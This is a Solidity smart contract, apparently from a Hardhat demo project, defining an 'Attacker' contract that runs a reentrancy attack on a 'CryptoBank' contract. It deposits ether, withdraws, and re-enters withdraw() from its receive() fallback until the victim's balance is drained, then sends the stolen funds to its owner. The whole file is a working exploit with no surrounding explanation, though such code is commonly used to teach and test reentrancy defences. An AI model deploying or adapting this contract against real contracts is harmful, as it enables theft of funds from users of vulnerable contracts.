// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;
import "hardhat/console.sol";

interface ICryptoBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    ICryptoBank public immutable cryptoBank;
    address private owner;

    constructor(address cryptoBankAddress) {
        cryptoBank = ICryptoBank(cryptoBankAddress);
        owner = msg.sender;
    }

    function attack() external payable onlyOwner {
        cryptoBank.deposit{value: msg.value}();
        cryptoBank.withdraw();
    }

    receive() external payable {
        if (address(cryptoBank).balance > 0) {
            console.log("reentering...");
            cryptoBank.withdraw();
        } else {
            console.log('victim account drained');
            payable(owner).transfer(address(this).balance);
        }
    }

    // check the total balance of the Attacker contract
    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Only the owner can attack.");
        _;
    } 
}
